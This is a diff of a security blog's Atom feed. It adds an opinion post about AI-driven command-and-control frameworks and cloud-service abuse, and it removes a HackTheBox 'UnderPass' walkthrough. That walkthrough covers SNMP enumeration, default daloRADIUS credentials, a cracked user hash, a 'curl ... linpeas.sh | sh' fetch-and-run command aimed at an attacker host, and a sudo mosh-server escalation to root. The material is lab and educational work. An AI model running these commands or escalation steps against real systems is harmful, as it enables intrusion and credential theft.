@@ -1,4 +1,4 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.10.0">Jekyll</generator><link href="https://dcodezero.github.io//feed.xml" rel="self" type="application/atom+xml" /><link href="https://dcodezero.github.io//" rel="alternate" type="text/html" /><updated>2026-03-20T19:02:20+00:00</updated><id>https://dcodezero.github.io//feed.xml</id><title type="html">Dcodezero</title><subtitle> </subtitle><author><name>DcodeZer0</name><email>dcodezero@proton.me</email></author><entry><title type="html">Autonomous AI Red Teamers Are Here — And Your SOC Isn’t Ready</title><link href="https://dcodezero.github.io//red-team/ai-agents-red-team-2026/" rel="alternate" type="text/html" title="Autonomous AI Red Teamers Are Here — And Your SOC Isn’t Ready" /><published>2026-03-20T00:00:00+00:00</published><updated>2026-03-20T00:00:00+00:00</updated><id>https://dcodezero.github.io//red-team/ai-agents-red-team-2026</id><content type="html" xml:base="https://dcodezero.github.io//red-team/ai-agents-red-team-2026/"><![CDATA[<p>Let me be blunt: the 2026 red team landscape is already unrecognisable from three years ago, and most security teams are cosplaying like it’s still 2022. Autonomous AI agents are now running full kill chains — recon to exfil — without a human operator touching a keyboard. The attackers knew this before the defenders did. That’s the problem.</p>
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.10.0">Jekyll</generator><link href="https://dcodezero.github.io//feed.xml" rel="self" type="application/atom+xml" /><link href="https://dcodezero.github.io//" rel="alternate" type="text/html" /><updated>2026-03-20T20:21:07+00:00</updated><id>https://dcodezero.github.io//feed.xml</id><title type="html">Dcodezero</title><subtitle> </subtitle><author><name>DcodeZer0</name><email>dcodezero@proton.me</email></author><entry><title type="html">Autonomous AI Red Teamers Are Here — And Your SOC Isn’t Ready</title><link href="https://dcodezero.github.io//red-team/ai-agents-red-team-2026/" rel="alternate" type="text/html" title="Autonomous AI Red Teamers Are Here — And Your SOC Isn’t Ready" /><published>2026-03-20T00:00:00+00:00</published><updated>2026-03-20T00:00:00+00:00</updated><id>https://dcodezero.github.io//red-team/ai-agents-red-team-2026</id><content type="html" xml:base="https://dcodezero.github.io//red-team/ai-agents-red-team-2026/"><![CDATA[<p>Let me be blunt: the 2026 red team landscape is already unrecognisable from three years ago, and most security teams are cosplaying like it’s still 2022. Autonomous AI agents are now running full kill chains — recon to exfil — without a human operator touching a keyboard. The attackers knew this before the defenders did. That’s the problem.</p>
 
 <p>This isn’t science fiction. In March 2026, The Register documented rogue AI agents collaborating <em>with each other</em> to escalate privileges and bypass endpoint controls. TrojAI shipped production-grade “Agent-Led AI Red Teaming” that coordinates hundreds of autonomous bots, each hunting a different attack vector in parallel. Meanwhile, only <strong>32% of enterprise attack surfaces</strong> are being tested by anyone — human or machine. Do the math on that gap.</p>
 
@@ -93,7 +93,126 @@
 
 <p>And if you’re in leadership: the era of “we do an annual pentest” as a security posture is over. It was already over. Now it’s just embarrassing.</p>
 
-<p>The machines are in the fight. The question is whose side they’re winning for.</p>]]></content><author><name>DcodeZer0</name><email>dcodezero@proton.me</email></author><category term="Red-team" /><category term="ai-security" /><category term="red-team" /><category term="offensive-security" /><category term="autonomous-agents" /><category term="pentesting" /><summary type="html"><![CDATA[AI agents are now discovering zero-days, chaining exploits, and exfiltrating data — without a human in the loop. The offense side figured this out first.]]></summary></entry><entry><title type="html">AI Red Teaming &amp;amp; Malware ML: GitHub Resources You Should Know</title><link href="https://dcodezero.github.io//ai-security/red-team/ai-redteam-resources/" rel="alternate" type="text/html" title="AI Red Teaming &amp;amp; Malware ML: GitHub Resources You Should Know" /><published>2026-03-20T00:00:00+00:00</published><updated>2026-03-20T00:00:00+00:00</updated><id>https://dcodezero.github.io//ai-security/red-team/ai-redteam-resources</id><content type="html" xml:base="https://dcodezero.github.io//ai-security/red-team/ai-redteam-resources/"><![CDATA[<p>As AI systems get embedded into critical infrastructure, the attack surface grows — and so does the tooling available to security researchers. This post documents the most relevant GitHub repositories for AI red teaming, LLM jailbreaking, and malware ML research, organized by risk level and use case.</p>
+<p>The machines are in the fight. The question is whose side they’re winning for.</p>]]></content><author><name>DcodeZer0</name><email>dcodezero@proton.me</email></author><category term="Red-team" /><category term="ai-security" /><category term="red-team" /><category term="offensive-security" /><category term="autonomous-agents" /><category term="pentesting" /><summary type="html"><![CDATA[AI agents are now discovering zero-days, chaining exploits, and exfiltrating data — without a human in the loop. The offense side figured this out first.]]></summary></entry><entry><title type="html">Your EDR Is Already Dead: The Rise of AI-Powered C2 Frameworks in 2026</title><link href="https://dcodezero.github.io//red-team/ai-c2-frameworks-2026/" rel="alternate" type="text/html" title="Your EDR Is Already Dead: The Rise of AI-Powered C2 Frameworks in 2026" /><published>2026-03-20T00:00:00+00:00</published><updated>2026-03-20T00:00:00+00:00</updated><id>https://dcodezero.github.io//red-team/ai-c2-frameworks-2026</id><content type="html" xml:base="https://dcodezero.github.io//red-team/ai-c2-frameworks-2026/"><![CDATA[<p>Let me be blunt: the EDR you spent $200K on last year? An adversary with the right AI-augmented C2 framework walked right past it this morning, grabbed your crown jewels, and left through the front door using your own IT admin’s credentials. And your SIEM didn’t blink.</p>
+
+<p>Welcome to 2026. The attackers leveled up. Most defenders didn’t.</p>
+
+<p>This isn’t FUD. Rapid7’s 2026 Global Threat Landscape Report shows exploited high/critical vulnerabilities surged <strong>105% year-over-year</strong> while attack timelines collapsed — sometimes to <em>hours</em> after disclosure. IBM’s threat intelligence confirms that 41% of active ransomware families now use AI to dynamically adapt payload delivery in real time. The game has changed. Fundamentally.</p>
+
+<p>Here’s what’s actually happening on the offensive side — and why the blue team playbook needs a full rewrite.</p>
+
+<hr />
+
+<h2 id="1-the-post-malware-era-is-here-and-nobody-told-the-soc">1. The “Post-Malware” Era Is Here and Nobody Told the SOC</h2>
+
+<p>The single biggest shift in offensive operations right now isn’t a flashy new RAT or a zero-day. It’s the near-total abandonment of traditional malware delivery in favor of <strong>Living Off the Land (LOTL)</strong> techniques — supercharged by AI.</p>
+
+<p>Attackers in 2026 don’t need to drop a <code class="language-plaintext highlighter-rouge">.exe</code>. They’re using <strong>PowerShell, WMI, Python, legitimate cloud APIs, and your own RMM tools</strong> to move laterally, exfiltrate data, and maintain persistence. Everything looks like normal admin traffic because <em>it is</em> normal admin traffic — just weaponized.</p>
+
+<p>Now layer AI on top of this. AI-driven LOTL means the attack adapts in real time. If a PowerShell one-liner gets flagged, the C2 framework generates a new variant, tests it against the target environment’s known AV signature set, and executes — autonomously. No human attacker needed between recon and data exfiltration.</p>
+
+<p>Your rule-based SIEM? It’s looking for known-bad signatures. It won’t find this.</p>
+
+<hr />
+
+<h2 id="2-sliver-havoc-and-mythic-the-new-operator-toolkit-and-why-its-winning">2. Sliver, Havoc, and Mythic: The New Operator Toolkit (And Why It’s Winning)</h2>
+
+<p>Cobalt Strike’s dominance is officially over. Security vendors have gotten <em>too good</em> at detecting Beacon. The community knows it, and threat actors know it.</p>
+
+<p>The new generation of C2 frameworks that are dominating offensive ops right now:</p>
+
+<ul>
+  <li><strong>Sliver</strong> — Open-source, Go-based, with WireGuard and DoH (DNS-over-HTTPS) C2 channels built in. Detection is a nightmare for defenders. It’s used by everything from nation-state APTs to RaaS affiliates now.</li>
+  <li><strong>Havoc</strong> — The spiritual successor to Cobalt Strike with a modern UI and <strong>massively</strong> improved evasion capabilities. AMSI bypass, ETW patching, and indirect syscalls are first-class citizens.</li>
+  <li><strong>Mythic</strong> — The most modular framework in the space. Agents written in any language, served over any protocol, with a plugin ecosystem that lets operators customize every single layer.</li>
+  <li><strong>Brute Ratel C4</strong> — Controversial, expensive, and genuinely scary. Written specifically to evade CrowdStrike and Defender for Endpoint. It succeeded.</li>
+</ul>
+
+<p>Here’s my hot take: <strong>the open-source frameworks are now more dangerous than the commercial ones.</strong> Because they’re community-audited by attackers looking to improve them, constantly updated, and free. Sliver’s GitHub has nearly 10,000 stars. That’s a lot of red teamers — and threat actors — contributing evasion improvements.</p>
+
+<hr />
+
+<h2 id="3-ai-c2-the-framework-that-doesnt-need-an-operator">3. AI-C2: The Framework That Doesn’t Need an Operator</h2>
+
+<p>This is where it gets genuinely alarming.</p>
+
+<p>“AI-C2 frameworks” — anticipated in threat forecasts for 2026 — are not science fiction anymore. The architecture looks like this:</p>
+
+<ol>
+  <li><strong>Agentic AI orchestration layer</strong> sits above traditional C2 infrastructure</li>
+  <li>AI agent handles recon autonomously (OSINT, subdomain enum, vuln scanning)</li>
+  <li>On exploitation, the AI selects the optimal post-exploitation path based on environment fingerprinting</li>
+  <li>C2 traffic is dynamically <strong>polymorphic</strong> — adapting shape, timing, and protocol to blend with baseline network traffic</li>
+  <li>If detection is triggered, the AI pivots to a backup C2 channel (cloud API abuse, DNS, HTTPS to a legit CDN)</li>
+</ol>
+
+<p>SnappyClient — a newly documented C++-based C2 caught in HijackLoader campaigns this month — already previews some of this. AMSI bypass, keystroke logging, remote terminal, browser credential theft. Fully automated from delivery to exfil.</p>
+
+<p>The trajectory is clear: <strong>the human operator is being removed from the loop.</strong> Autonomous attacker bots that operate at machine speed, 24/7, with no fatigue or mistakes. A single threat actor can now run hundreds of simultaneous intrusion campaigns.</p>
+
+<hr />
+
+<h2 id="4-cloud-as-c2-abusing-the-services-you-already-trust">4. Cloud as C2: Abusing the Services You Already Trust</h2>
+
+<p>Here’s a technique that should keep every network defender up at night: <strong>legitimate cloud API abuse for C2</strong>.</p>
+
+<p>Attackers are embedding C2 traffic inside:</p>
+<ul>
+  <li><strong>Microsoft Teams webhooks</strong></li>
+  <li><strong>Slack API calls</strong></li>
+  <li><strong>Google Drive file sync traffic</strong></li>
+  <li><strong>GitHub Gists</strong> (used for staging payloads and exfil)</li>
+  <li><strong>AWS S3, Azure Blob Storage</strong></li>
+</ul>
+
+<p>Why? Because you can’t block Microsoft 365 traffic without breaking your entire organization. The attacker’s C2 beacons look identical to your marketing team uploading files to SharePoint. The exfil looks like a Zoom recording upload.</p>
+
+<p>This is modular, cloud-integrated C2 at its best — and worst. And it completely defeats perimeter-based detection.</p>
+
+<p><strong>Hot take:</strong> Any organization that doesn’t have <strong>behavioral anomaly detection on cloud API usage</strong> in 2026 is running blind. Signature-based detection for this class of C2 is provably useless.</p>
+
+<hr />
+
+<h2 id="5-the-defense-that-actually-works-its-not-what-vendors-are-selling-you">5. The Defense That Actually Works (It’s Not What Vendors Are Selling You)</h2>
+
+<p>Alright, enough doom. What actually works against AI-augmented C2 in 2026? Here’s what the serious practitioners are deploying — not what the vendor slide decks say.</p>
+
+<p><strong>Identity-first security is the last line that holds.</strong> Every serious intrusion this year starts with credential compromise. Airtight MFA (not SMS-based), privileged access workstations, just-in-time admin access, and FIDO2 hardware keys for tier-0 assets. This is non-negotiable.</p>
+
+<p><strong>Behavioral baselines beat signatures every time.</strong> You need to know what “normal” looks like for every user, endpoint, and cloud API call. Deviations — even tiny ones — need to trip alerts. AI-powered UEBA (User and Entity Behavior Analytics) is the only tooling that can keep pace with AI-powered attackers.</p>
+
+<p><strong>AI red teaming is mandatory now.</strong> You cannot defend against AI-augmented attacks without red-teaming your own AI systems AND using AI in your red team operations to find gaps before attackers do. Google’s dedicated AI Red Team, Pentera’s adversarial AI agent, RunSybil’s $40M bet on autonomous offensive security — the industry is screaming this at you.</p>
+
+<p><strong>Assume breach, always.</strong> The “prevent everything” model is dead. Your incident response plan needs to assume that a sufficiently motivated, AI-equipped adversary will get initial access. The question is whether you can detect lateral movement and exfil before the damage is done.</p>
+
+<p><strong>Hunt for C2 traffic, don’t wait for alerts.</strong> Proactive threat hunting for beacon patterns, unusual DNS queries, HTTPS to unknown CDNs, and cloud API anomalies catches what automated tools miss. A dedicated threat hunt team running Sliver/Havoc/Mythic indicators in your telemetry is worth more than three additional EDR licenses.</p>
+
+<hr />
+
+<h2 id="the-uncomfortable-truth">The Uncomfortable Truth</h2>
+
+<p>The cybersecurity industry has a <strong>revenue-aligned incentive to sell you products</strong> rather than tell you the hard truth: most enterprise security stacks are woefully behind the current threat landscape. Your vendor’s AI feature is a marketing checkbox. The attacker’s AI is actively improving every single campaign.</p>
+
+<p>The gap between offensive capability and defensive capability has never been wider. AI-C2 frameworks are not a future threat — they are this quarter’s threat. Organizations that treat this as “next year’s problem” are this year’s breach victims.</p>
+
+<hr />
+
+<h2 id="practical-takeaways">Practical Takeaways</h2>
+
+<ol>
+  <li><strong>Audit your C2 detection rules</strong> — Are they catching Sliver, Havoc, and Mythic, or just Cobalt Strike Beacon from 2021?</li>
+  <li><strong>Run a cloud API abuse exercise</strong> — Can your SOC detect a Teams or Slack webhook being used as a C2 channel?</li>
+  <li><strong>Enforce FIDO2 everywhere tier-0 touches</strong> — The identity layer is the last one that reliably holds.</li>
+  <li><strong>Stand up a threat hunt program</strong> — Even two dedicated hunters reviewing telemetry weekly will find what automated tools miss.</li>
+  <li><strong>Start AI red teaming your own AI stack</strong> — LLM wrappers, AI coding assistants, agentic workflows — these are all new attack surfaces with zero mature defensive tooling.</li>
+  <li><strong>Map your LOTL exposure</strong> — Which legitimate tools (PSExec, WMI, Python, PowerShell) could an attacker abuse in your environment? Instrument them all.</li>
+</ol>
+
+<p>The attackers didn’t wait for the market to mature. Neither should you.</p>
+
+<hr />
+
+<p><em>DcodeZero covers offensive security, red team tradecraft, and threat intelligence. If this post made you uncomfortable, good — go fix something.</em></p>]]></content><author><name>DcodeZer0</name><email>dcodezero@proton.me</email></author><category term="Red-team" /><category term="C2" /><category term="red-team" /><category term="AI-security" /><category term="malware" /><category term="offensive-security" /><category term="threat-intel" /><summary type="html"><![CDATA[AI-native C2 frameworks are rewriting the rules of offensive ops — and most blue teams are still playing checkers.]]></summary></entry><entry><title type="html">AI Red Teaming &amp;amp; Malware ML: GitHub Resources You Should Know</title><link href="https://dcodezero.github.io//ai-security/red-team/ai-redteam-resources/" rel="alternate" type="text/html" title="AI Red Teaming &amp;amp; Malware ML: GitHub Resources You Should Know" /><published>2026-03-20T00:00:00+00:00</published><updated>2026-03-20T00:00:00+00:00</updated><id>https://dcodezero.github.io//ai-security/red-team/ai-redteam-resources</id><content type="html" xml:base="https://dcodezero.github.io//ai-security/red-team/ai-redteam-resources/"><![CDATA[<p>As AI systems get embedded into critical infrastructure, the attack surface grows — and so does the tooling available to security researchers. This post documents the most relevant GitHub repositories for AI red teaming, LLM jailbreaking, and malware ML research, organized by risk level and use case.</p>
 
 <blockquote>
   <p>⚠️ <strong>Warning:</strong> Some repositories listed here contain actual malware samples or tools capable of bypassing AI safety systems. Use only in isolated, sandboxed environments.</p>
@@ -3997,223 +4116,4 @@ previous conversation context.]"
 
 <hr />
 
-<p><em>In the next post, I’ll cover the network architecture and how I isolate lab environments from my home network.</em></p>]]></content><author><name>DcodeZer0</name><email>dcodezero@proton.me</email></author><category term="IT" /><category term="HomeLab" /><category term="IT" /><category term="Infra" /><category term="Infrastructure" /><category term="Dell" /><category term="Proxmox" /><summary type="html"><![CDATA[Upgrading from HP DL380 G7 to Dell R730xd - more cores, better efficiency, and ready to host AD labs.]]></summary></entry><entry><title type="html">HackTheBox UnderPass</title><link href="https://dcodezero.github.io//hackthebox/Underpass/" rel="alternate" type="text/html" title="HackTheBox UnderPass" /><published>2025-01-10T00:00:00+00:00</published><updated>2025-01-10T00:00:00+00:00</updated><id>https://dcodezero.github.io//hackthebox/Underpass</id><content type="html" xml:base="https://dcodezero.github.io//hackthebox/Underpass/"><![CDATA[<h3 id="nmap-scan">Nmap scan:</h3>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Starting Nmap 7.94 ( https://nmap.org ) at 2025-01-08 22:49 PST
-Nmap scan report for 10.10.11.48
-Host is up (0.047s latency).
-Not shown: 65533 closed tcp ports (conn-refused)
-PORT   STATE SERVICE VERSION
-22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
-| ssh-hostkey: 
-|   256 48:b0:d2:c7:29:26:ae:3d:fb:b7:6b:0f:f5:4d:2a:ea (ECDSA)
-|_  256 cb:61:64:b8:1b:1b:b5:ba:b8:45:86:c5:16:bb:e2:a2 (ED25519)
-80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
-|_http-server-header: Apache/2.4.52 (Ubuntu)
-|_http-title: Apache2 Ubuntu Default Page: It works
-Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
-
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 64.56 seconds
-
-</code></pre></div></div>
-
-<h3 id="trying-dirby">Trying Dirby:</h3>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>└─$ dirb http://10.10.11.48   
-
------------------
-DIRB v2.22    
-By The Dark Raver
------------------
-
-START_TIME: Wed Jan  8 22:51:43 2025
-URL_BASE: http://10.10.11.48/
-WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
-
------------------
-
-GENERATED WORDS: 4612                                                          
-
----- Scanning URL: http://10.10.11.48/ ----
-+ http://10.10.11.48/index.html (CODE:200|SIZE:10671)                                                                                                                          
-+ http://10.10.11.48/server-status (CODE:403|SIZE:276)                                                                                                                         
------------------
-END_TIME: Wed Jan  8 22:56:03 2025
-DOWNLOADED: 4612 - FOUND: 2
-
-</code></pre></div></div>
-
-<p>Found noting intresting so far. Quickly checking with a UDP scan using nmap</p>
-
-<h4 id="udp-enumeration">UDP Enumeration:</h4>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>└─$ sudo nmap -sU --top-ports 100 10.10.11.48 
-[sudo] password for kali: 
-Starting Nmap 7.94 ( https://nmap.org ) at 2025-01-08 22:59 PST
-Stats: 0:00:16 elapsed; 0 hosts completed (1 up), 1 undergoing UDP Scan
-UDP Scan Timing: About 10.25% done; ETC: 23:00 (0:00:35 remaining)
-Nmap scan report for 10.10.11.48
-Host is up (0.20s latency).
-Not shown: 97 closed udp ports (port-unreach)
-PORT     STATE         SERVICE
-161/udp  open          snmp
-1812/udp open|filtered radius
-1813/udp open|filtered radacct
-
-Nmap done: 1 IP address (1 host up) scanned in 130.06 seconds
-</code></pre></div></div>
-
-<p>Found that port number 161 is open with service SNMP:</p>
-
-<p>Next will be using a MSFs aux scanner for SNMP enum:</p>
-
-<p><img src="/assets/images/sample/Underpass/1.png" alt="1.png" /></p>
-
-<p><img src="/assets/images/sample/Underpass/2.png" alt="1.png" /></p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[+] 10.10.11.48, Connected.
-
-[*] System information:
-
-Host IP                       : 10.10.11.48
-Hostname                      : UnDerPass.htb is the only daloradius server in the basin!
-Description                   : Linux underpass 5.15.0-126-generic #136-Ubuntu SMP Wed Nov 6 10:38:22 UTC 2024 x86_64
-Contact                       : steve@underpass.htb
-Location                      : Nevada, U.S.A. but not Vegas
-Uptime snmp                   : 11:03:16.58
-Uptime system                 : 11:03:06.35
-System date                   : 2025-1-9 06:48:46.0
-
-
-[*] Scanned 1 of 1 hosts (100% complete)
-[*] Auxiliary module execution completed
-</code></pre></div></div>
-
-<p>From the above Information, we can observe that there is a host name related to some thing to <code class="language-plaintext highlighter-rouge">daloradious</code>.</p>
-
-<p>Exploring more about on this, I quickly came to understand that daloradius is a framework for deployment of FreeRADIUS servers.</p>
-
-<table>
-  <tbody>
-    <tr>
-      <td>Remote Authentication Dial-In User Service is a networking protocol that provides centralized authentication, authorisation, and accounting management for users who connect and use a network service.</td>
-    </tr>
-  </tbody>
-</table>
-
-<p>If we look at the git repo, we can observe that there are multiple folders which contain details to more pages which contain some login pages.</p>
-
-<p><code class="language-plaintext highlighter-rouge">Users</code>
-<code class="language-plaintext highlighter-rouge">Operators</code>
-<code class="language-plaintext highlighter-rouge">common</code></p>
-
-<p>So navigating to the paths will lang to the login page.</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>1. http://underpass.htb/daloradius/app/users/login.php
-2. http://underpass.htb/daloradius/app/operators/login.php
-</code></pre></div></div>
-
-<p><img src="/assets/images/sample/Underpass/3.png" alt="1.png" /></p>
-
-<p><img src="/assets/images/sample/Underpass/4.png" alt="1.png" /></p>
-
-<p>Now, I’ll quickly check the if I can access that directory of that name.</p>
-
-<h5 id="default-creds">Default Creds:</h5>
-
-<p>The default creds can be found from the wiki doc below:</p>
-
-<p>https://github.com/lirantal/daloradius/wiki/Installing-daloRADIUS</p>
-
-<p>Use the default creds against the machine will grant the login access.</p>
-
-<p>Note: The creds will only work with the URL with /operators/</p>
-
-<p><img src="/assets/images/sample/Underpass/6.png" alt="1.png" /></p>
-
-<p>After login, we can navigate to the user management and check for other users in the application, by navigating to the top right corner of the web app.</p>
-
-<p><img src="/assets/images/sample/Underpass/7.png" alt="1.png" /></p>
-
-<p>Username: svcMosh
-HASH: 412DD4759978ACFCC81DEAB01B382403</p>
-
-<p>Using crack station to crack the hash of the users.</p>
-
-<p><img src="/assets/images/sample/Underpass/8.png" alt="1.png" /></p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Username: svcMosh
-Password: underwaterfriends
-</code></pre></div></div>
-
-<p>Now, login via ssh with the compromised username and password.</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>└─$ ssh svcMosh@underpass.htb
-The authenticity of host 'underpass.htb (10.10.11.48)' can't be established.
-ED25519 key fingerprint is SHA256:zrDqCvZoLSy6MxBOPcuEyN926YtFC94ZCJ5TWRS0VaM.
-This key is not known by any other names.
-Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
-Warning: Permanently added 'underpass.htb' (ED25519) to the list of known hosts.
-svcMosh@underpass.htb's password: 
-Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-126-generic x86_64)
-
- * Documentation:  https://help.ubuntu.com
- * Management:     https://landscape.canonical.com
- * Support:        https://ubuntu.com/pro
-
- System information as of Thu Jan  9 08:26:01 AM UTC 2025
-
-  System load:  0.68              Processes:             249
-  Usage of /:   90.8% of 3.75GB   Users logged in:       1
-  Memory usage: 18%               IPv4 address for eth0: 10.10.11.48
-  Swap usage:   0%
-
-  =&gt; / is using 90.8% of 3.75GB
-
-
-Expanded Security Maintenance for Applications is not enabled.
-
-0 updates can be applied immediately.
-
-Enable ESM Apps to receive additional future security updates.
-See https://ubuntu.com/esm or run: sudo pro status
-
-
-The list of available updates is more than a week old.
-To check for new updates run: sudo apt update
-Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
-
-
-Last login: Thu Jan  9 08:18:47 2025 from 10.10.14.42
-svcMosh@underpass:~$ ls
-user.txt
-svcMosh@underpass:~$ cat user.txt 
-</code></pre></div></div>
-
-<h3 id="privilege-escalation">Privilege escalation:</h3>
-
-<p>The traditional way to search for privilege escalation technique is by using linpeas.sh</p>
-
-<p>Link: https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS</p>
-
-<p><code class="language-plaintext highlighter-rouge">svcMosh@underpass:~$ curl -L http://10.10.14.13:8000/linpeas.sh | sh</code></p>
-
-<p>The other way around to check privileages to check by using <code class="language-plaintext highlighter-rouge">sudo -l</code></p>
-
-<p><img src="/assets/images/sample/Underpass/9.png" alt="1.png" /></p>
-
-<p>The line <code class="language-plaintext highlighter-rouge">(ALL) NOPASSWD: /usr/bin/mosh-server</code> is typically part of a <code class="language-plaintext highlighter-rouge">sudoers</code> configuration file. It specifies permissions for the <code class="language-plaintext highlighter-rouge">sudo</code> command and determines how certain users or groups can execute specific commands with elevated privileges.</p>
-
-<p>The above basically means that, this line appears in the <code class="language-plaintext highlighter-rouge">sudoers</code> file (edited with <code class="language-plaintext highlighter-rouge">visudo</code>), a user could run:</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo /usr/bin/mosh-server
-</code></pre></div></div>
-
-<p>Now execute the below command to connect to local host and gain root access.</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mosh --server="sudo /usr/bin/mosh-server" localhost
-</code></pre></div></div>
-<p><img src="/assets/images/sample/Underpass/11.png" alt="1.png" /></p>
-
-<p><img src="/assets/images/sample/Underpass/10.png" alt="1.png" /></p>]]></content><author><name>DcodeZer0</name><email>dcodezero@proton.me</email></author><category term="hackthebox" /><category term="HTB" /><category term="Linux" /><summary type="html"><![CDATA[UnderPass is a HTB easy linux machine, Created by dakkmaddy. The Box is mainly based on Enumerations and basic priv escalations.]]></summary></entry></feed>
+<p><em>In the next post, I’ll cover the network architecture and how I isolate lab environments from my home network.</em></p>]]></content><author><name>DcodeZer0</name><email>dcodezero@proton.me</email></author><category term="IT" /><category term="HomeLab" /><category term="IT" /><category term="Infra" /><category term="Infrastructure" /><category term="Dell" /><category term="Proxmox" /><summary type="html"><![CDATA[Upgrading from HP DL380 G7 to Dell R730xd - more cores, better efficiency, and ready to host AD labs.]]></summary></entry></feed>
